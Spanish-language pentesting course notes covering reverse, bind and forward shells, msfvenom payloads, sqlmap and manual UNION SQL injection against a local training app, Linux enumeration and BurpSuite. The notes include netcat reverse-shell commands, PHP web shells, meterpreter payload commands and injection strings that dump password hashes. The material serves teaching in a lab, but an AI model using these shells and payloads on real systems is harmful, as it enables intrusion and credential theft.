# Introducción a la explotación de vulnerabilidades

Una vez aplicada la fase de reconocimiento inicial, ya podríamos proceder con la fase de explotación, pero es importante comprender algunos conceptos antes de comenzar con la explotación de vulnerabilidades.

A lo largo de las siguientes clases, exploraremos diferentes tipos de shells (como las reverse shells, bind shells y forward shells), las cuales nos permitirán establecer conexiones de red y tomar control de un sistema comprometido. Hablaremos sobre los diferentes tipos de payloads (staged y non-staged) y cómo se utilizan para ejecutar código malicioso en el sistema objetivo.

Además, se discutirá la diferencia entre las explotaciones manuales y automatizadas, presentando herramientas que pueden ser utilizadas para automatizar el proceso de explotación de vulnerabilidades.

Por último, se introducirá la herramienta BurpSuite, una suite de herramientas para realizar pruebas de penetración y análisis de vulnerabilidades en aplicaciones web.


# Reverse Shells, Bind Shells y Forward Shells


- Reverse Shell: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.




### Ejemplo

```bash
nano Dockerfile
```


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```


docker build -t image_name .


docker run -dit -p 80:80 --name container_name image_name

docker exec -it container_name bash



### Atacante

nc -nlvp 443


### Cliente 

nc -e /bin/bash ip puertp

ncat -e /bin/bash 172.17.0.1 443


### Obtener una mejor shell 

script /dev/null -c bash


- Bind Shell: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.



### Cliente 

nc -nlvp 443 -e /bin/bash

### Atacante

nc ip puerto



- Forward shell

### Obtener una mejor shell 

script /dev/null -c bash



### Ejemplo

```bash
nano Dockerfile
```


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```


docker build -t image_name .


docker run -dit -p 80:80 --name container_name image_name

docker exec -it container_name bash



- Forward Shell: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de mkfifo, que crea un archivo FIFO (named pipe), que se utiliza como una especie de “consola simulada” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, lo que permite la comunicación bidireccional con la máquina remota.




### IPTABLES


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```

docker build -t image_name .


docker run -dit -p 80:80 --cap-add=NET_ADMIN --name container_name image_name

docker exec -it container_name bash



apt install iptables 

iptables --flush

**Acptar todas las conexiones al puerto 80**

//iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
//iptables -A OUTPUT -p tcp -m tcp --dport 0-65535 -m contrack --ctstate NEW -j DROP


iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT

iptables -A OUTPUT -o eth0 -j DROP






```bash
<?
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"
>
```

### TTYOverHTTP

En ocasiones cuando comprometemos un servidor web, hay reglas configuradas (Ej: iptables) que nos impiden obtener una Reverse Shell vía Netcat, Python, u otra utilidad.

Con esta herramienta, evitamos tener que hacer uso de una reverse shell para obtener una TTY posteriormente completamente interactiva. A través de archivos 'mkfifo', jugamos para simular una TTY interactiva sobre HTTP, logrando manejarnos sobre el sistema cómodamente sin ningún tipo de problema.

Lo único que necesitamos, es subir al servidor comprometido una estructura PHP como la siguiente para ejecutar comandos:

<?php
	echo shell_exec($_REQUEST['cmd']);
?>
Una vez subido, simplemente ejecutamos el script (Es necesario cambiar la ruta en el script donde se sitúa nuestro script PHP alojado en el servidor vulnerado).

Tras su ejecución, se muestra un ejemplo de su utilidad:



https://github.com/s4vitar/ttyoverhttp


**Cambiar el nombre del archivo**

index.php  --> cmd.php

	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()




mkfifo input; tail -f input | /bin/sh 2>&1 > output

echo "whoami" > input

cat output



# Tipos de payloads (Staged y Non-Staged)

En esta clase, veremos los dos tipos de payloads utilizados en ataques informáticos: Staged y Non-Staged.

- Payload Staged: Es un tipo de payload que se divide en dos o más etapas. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.




## msfvenom

**msfvenom es técnicamente parte del marco de Metasploit, sin embargo, se envía como una herramienta independiente. msfvenom se usa para generar cargas útiles en la marcha.**


**WINDOWS**

msfvenom -P Windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST = <Inding-ip> LPORT = <Inding-Port>


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=ip LPORT=443 -f exe -o reverse.exe
```

-F <Format>
Especifica el formato de salida. En este caso, eso es un ejecutable (exe)
-o <archivo>
La ubicación de salida y el nombre de archivo para la carga útil generada.
Lhost = <ip>
Especifica la IP para conectarse nuevamente. Al usar TryhackMe, esta será su dirección IP TUN0. Si no puede cargar el enlace, no está conectado a la VPN.
Lport = <port>



## Meterpreter

Type use exploit/multi/handler

// set PAYLOAD <payload>
set LHOST <ip_atacante>
set LPORT <pueto_atacante>



What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf  LHOST=10.10.10.5 LPORT=443






- Payload Non-Staged: Es un tipo de payload que se envía como una sola entidad y no se divide en múltiples etapas. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.



```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp  --platform windows -a x64 LHOST=ip LPORT=443 -f exe -o reverse.exe
```

## Meterpreter

Type use exploit/multi/handler

set PAYLOAD <payload>
set LHOST <ip_atacante>
set LPORT <pueto_atacante>




# Tipos de explotación (Manuales y Automatizadas)

En esta clase, veremos los dos tipos de explotación utilizados en ataques informáticos: Manuales y Automatizadas.

Explotación Manual: Es un tipo de explotación que se realiza de manera manual y requiere que el atacante tenga un conocimiento profundo del sistema y sus vulnerabilidades. En este enfoque, el atacante utiliza herramientas y técnicas específicas para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más lento y requiere más esfuerzo y habilidad por parte del atacante, pero también es más preciso y permite un mayor control sobre el proceso de explotación.
Explotación Automatizada: Es un tipo de explotación que se realiza automáticamente mediante el uso de herramientas automatizadas, como scripts o programas diseñados específicamente para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más rápido y menos laborioso que el enfoque manual, pero también puede ser menos preciso y puede generar más ruido en la red objetivo, lo que aumenta el riesgo de detección.
Es importante tener en cuenta que el tipo de explotación utilizado en un ataque dependerá de los objetivos del atacante, sus habilidades y del nivel de seguridad implementado en el sistema objetivo. En general, los ataques de explotación manual son más precisos y discretos, pero también requieren más tiempo y habilidades. Por otro lado, los ataques de explotación automatizada son más rápidos y menos laboriosos, pero también pueden ser más ruidosos y menos precisos.

A continuación, se os proporciona el enlace del proyecto de Github que utilizamos para explicar ambos enfoques:

sqlinjection-training-app: https://github.com/appsecco/sqlinjection-training-app

### Contenido Archivo sqlmap

```bash
POST /searchproducts.php HTTP/1.1
Host: localhost:8000
Content-Length: 11
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8000/searchproducts.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c3013a0ad83605593aaafcfc6d60b8d8
Connection: close

searchitem=```


### SQLMAP

```bash
sqlmap -r sqlmap -p searchitem --batch
```


sqlmap -r sqlmap -p searchitem --batch --dbs


[*] information_schema
[*] mysql
[*] performance_schema
[*] sqlitraining
[*] sys



└─$ sqlmap -r sqlmap -p searchitem --batch -D sqlitraining --tables



[2 tables]
+----------+
| products |
| users    |
+----------+



 sqlmap -r sqlmap -p searchitem --batch -D sqlitraining -T users --columns



[5 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | varchar(200) |
| fname       | varchar(30)  |
| id          | int          |
| password    | varchar(33)  |
| username    | varchar(200) |
+-------------+--------------+




 sqlmap -r sqlmap -p searchitem --batch -D sqlitraining -T users -C username,password --dump



+-----------+---------------------------------------------+
| username  | password                                    |
+-----------+---------------------------------------------+
| admin     | 21232f297a57a5a743894a0e4a801fc3 (admin)    |
| bob       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| ramesh    | 9aeaed51f2b0f6680c4ed4b07fb1a83c (troll)    |
| suresh    | 9aeaed51f2b0f6680c4ed4b07fb1a83c (troll)    |
| alice     | c93239cae450631e9f55d71aed99e918 (alice1)   |
| voldemort | 856936b417f82c06139c74fa73b1abbe (horcrux)  |
| frodo     | f0f8820ee817181d9c6852a097d70d8d (frodo)    |
| hodor     | a55287e9d0b40429e5a944d10132c93e (hodor)    |
| rhombus   | e52848c0eb863d96bc124737116f23a4 (rhombus)  |
+-----------+---------------------------------------------+





searchitem=a' union select 1,schema_name,1,1,1 FROM information_schema.schemata -- -


searchitem=a' union SELECT 1,table_name,1,1,1  FROM information_schema.tables WHERE table_schema='sqlitraining' -- -


searchitem=a' union SELECT 1,column_name,1,1,1 FROM information_schema.columns  WHERE table_schema='sqlitraining' and table_name='users'-- -


searchitem=' union SELECT 1,username, password,1,1 FROM sqlitraining.users -- -

searchitem=' union SELECT 1,group_concat(username,0x3A,password),1,1,1 FROM sqlitraining.users -- -


admin:21232f297a57a5a743894a0e4a801fc3
bob:5f4dcc3b5aa765d61d8327deb882cf99
ramesh:9aeaed51f2b0f6680c4ed4b07fb1a83c
suresh:9aeaed51f2b0f6680c4ed4b07fb1a83c
alice:c93239cae450631e9f55d71aed99e918
voldemort:856936b417f82c06139c74fa73b1abbe
frodo:f0f8820ee817181d9c6852a097d70d8d
hodor:a55287e9d0b40429e5a944d10132c93e
rhombus:e52848c0eb863d96bc124737116f23a4





# Enumeración del sistema

En la clase, discutiremos la importancia de realizar una enumeración adecuada del sistema una vez que se ha logrado vulnerar su seguridad. La enumeración es un proceso crítico para identificar por ejemplo vías potenciales de poder elevar nuestros privilegios de usuario, así como para comprender la estructura del sistema objetivo y encontrar información útil para futuros ataques.

Algunas de las herramientas que vemos en esta clase son:

LSE (Linux Smart Enumeration): Es una herramienta de enumeración para sistemas Linux que permite a los atacantes obtener información detallada sobre la configuración del sistema, los servicios en ejecución y los permisos de archivo. LSE utiliza una variedad de comandos de Linux para recopilar información y presentarla en un formato fácil de entender. Al utilizar LSE, los atacantes pueden detectar posibles vulnerabilidades y encontrar información valiosa para futuros ataques.
Pspy: Es una herramienta de enumeración de procesos que permite a los atacantes observar los procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares de tiempo. Pspy es una herramienta útil para la detección de malware y backdoors, así como para la identificación de procesos maliciosos que se ejecutan en segundo plano sin la interacción del usuario.
Asimismo, desarrollaremos un script en Bash ideal para detectar tareas y comandos que se ejecutan en el sistema a intervalos regulares de tiempo, abusando para ello del comando ‘ps -eo user,command‘ que nos chivará todo lo que necesitamos.

A continuación, se proporciona el enlace a estas herramientas:

Herramienta LSE: https://github.com/diego-treitos/linux-smart-enumeration
Herramienta PSPY: https://github.com/DominicBreuker/pspy


wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh

chmod 700 lse.sh








find -perm -4000 2>/dev/null


### crontab


crontab -l


systemctl list-timers



# Introducción a BurpSuite

BurpSuite es una herramienta de prueba de penetración utilizada para encontrar vulnerabilidades de seguridad en aplicaciones web. Es una de las herramientas de prueba de penetración más populares y utilizadas en la industria de la seguridad informática. BurpSuite se compone de varias herramientas diferentes que se pueden utilizar juntas para identificar vulnerabilidades en una aplicación web.

Las principales herramientas que componen BurpSuite son las siguientes:

Proxy: Es la herramienta principal de BurpSuite y actúa como un intermediario entre el navegador web y el servidor web. Esto permite a los usuarios interceptar y modificar las solicitudes y respuestas HTTP y HTTPS enviadas entre el navegador y el servidor. El Proxy también es útil para la identificación de vulnerabilidades, ya que permite a los usuarios examinar el tráfico y analizar las solicitudes y respuestas.
Scanner: Es una herramienta de prueba de vulnerabilidades automatizada que se utiliza para identificar vulnerabilidades en aplicaciones web. El Scanner utiliza técnicas de exploración avanzadas para detectar vulnerabilidades en la aplicación web, como inyecciones SQL, cross-site scripting (XSS), vulnerabilidades de seguridad de la capa de aplicación (OSWAP Top 10) y más.
Repeater: Es una herramienta que permite a los usuarios reenviar y repetir solicitudes HTTP y HTTPS. Esto es útil para probar diferentes entradas y verificar la respuesta del servidor. También es útil para la identificación de vulnerabilidades, ya que permite a los usuarios probar diferentes valores y detectar respuestas inesperadas.
Intruder: Es una herramienta que se utiliza para automatizar ataques de fuerza bruta. Los usuarios pueden definir diferentes payloads para diferentes partes de la solicitud, como la URL, el cuerpo de la solicitud y las cabeceras. Posteriormente, Intruder automatiza la ejecución de las solicitudes utilizando diferentes payloads y los usuarios pueden examinar las respuestas para identificar vulnerabilidades.
Comparer: Es una herramienta que se utiliza para comparar dos solicitudes HTTP o HTTPS. Esto es útil para detectar diferencias entre las solicitudes y respuestas y analizar la seguridad de la aplicación.
Se trata de una herramienta extremadamente potente, la cual puede ser utilizada para identificar una amplia variedad de vulnerabilidades de seguridad en aplicaciones web. Al utilizar las diferentes herramientas que componen BurpSuite, los usuarios pueden identificar vulnerabilidades de forma automatizada o manual, según sus necesidades. Esto permite a los usuarios encontrar vulnerabilidades y corregirlas antes de que sean explotadas por un atacante.

En resumen, Burp Suite es una herramienta imprescindible para cualquier profesional de seguridad informática que busque asegurar la seguridad de aplicaciones web. En la siguiente sección, tendremos la oportunidad de utilizar BurpSuite en detalle y sacarle el máximo provecho a esta herramienta.